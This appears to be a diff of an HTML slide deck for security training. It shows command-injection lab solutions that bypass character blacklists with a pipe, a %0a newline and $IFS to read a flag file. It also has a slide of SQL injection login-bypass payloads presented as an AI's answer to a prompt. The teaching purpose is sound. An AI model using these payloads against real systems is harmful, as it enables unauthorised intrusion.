-<section id="s112" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Blacklist: ; &amp;</h2><span class="sol-where" style="margin-left:auto">Command Injection</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The filter strips <code>;</code> and <code>&amp;</code>, so <code>statement.pdf;cat…</code> collapses into one broken token.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Use a separator the blacklist forgot — the pipe survives.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">filename=statement.pdf|cat /tmp/flag_g9_&lt;id&gt;.txt</div><div class="sol-paynote">| was not on the list</div></div></section>
-<section id="s113" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Blacklist: ; &amp; | + spaces</h2><span class="sol-where" style="margin-left:auto">Command Injection</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Now <code>;</code>, <code>&amp;</code>, <code>|</code> and <b>spaces</b> are all stripped — the pipe is gone and no space survives.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Separate commands with a raw <b>newline</b> (<code>%0a</code>) and make a space without typing one, using <code>$IFS</code>.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">filename=statement.pdf%0acat$IFS/tmp/flag_g9_&lt;id&gt;.txt</div><div class="sol-paynote">also ${IFS}, $IFS$9, %09, {cat,/path}</div></div></section>
 <section id="s114" data-phase="The Chain" class="slide"><div class="slide-inner">
 <p class="sub mb1">Combining weaknesses</p>
 <h2>No real attacker uses one vulnerability. They chain them.</h2>
@@ -1483,9 +1546,9 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p style="font-family:var(--mono);color:var(--t1);margin:.5rem 0">"Generate SQL injection payloads to bypass a login form that checks customer_id and password"</p>
 <div class="sep"></div>
 <p style="color:var(--t3);font-size:.85rem">AI Output:</p>
-<pre style="margin-top:.5rem;border:none;background:transparent;padding:0"><code><span class="str">BS100234' -- </span>                <span class="cm">// Comment out password check</span>
-<span class="str">' OR 1=1 -- </span>                  <span class="cm">// Tautology bypass</span>
-<span class="str">' UNION SELECT 1,2,3,4 -- </span>    <span class="cm">// Column enumeration</span>
+<pre style="margin-top:.5rem;border:none;background:transparent;padding:0"><code><span class="str">BS100234' #</span>                <span class="cm">// Comment out password check</span>
+<span class="str">' OR 1=1 #</span>                  <span class="cm">// Tautology bypass</span>
+<span class="str">' UNION SELECT 1,2,3,4 #</span>    <span class="cm">// Column enumeration</span>
 <span class="str">admin'/*</span>                       <span class="cm">// Block comment variant</span></code></pre>
 </div>
 <p class="big mt2 center">AI can accelerate payload design and testing, but its output must be authorised, validated and constrained. It does not remove the need for technical expertise.</p>
@@ -1675,6 +1738,15 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p style="color:var(--t3);font-size:.9rem;margin-top:.5rem">« Ankit Rai • India Lead of Penetration Testing Team • Oct 2026 »</p>
 </div>
 </section>
+<section id="s130" data-phase="Takeaways" class="slide"><div class="slide-inner center">
+<p class="sub mb1">Where we leave it</p>
+<h1 class="gradient" style="font-size:clamp(1.7rem,3.4vw,2.6rem)">You will not leave a penetration tester.</h1>
+<p class="big mt2">You will leave able to tell the difference between<br/><em>&ldquo;we are secure&rdquo;</em> and <em>&ldquo;no one has checked.&rdquo;</em></p>
+<div class="card accent-left mt3" style="text-align:left;max-width:760px;margin-left:auto;margin-right:auto">
+<p class="desc"><strong style="color:var(--t1)">The one habit to keep:</strong> when someone tells you a system is safe, ask the quiet question &mdash; <em>&ldquo;safe because we checked, or safe because nothing has gone wrong yet?&rdquo;</em> Everything today was the second kind &mdash; right up until someone looked.</p>
+</div>
+<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem);color:var(--t2)">Now &mdash; the question you wrote down at the start. Did we get you there?</p>
+</div></section>
 </div>
 
 <script>
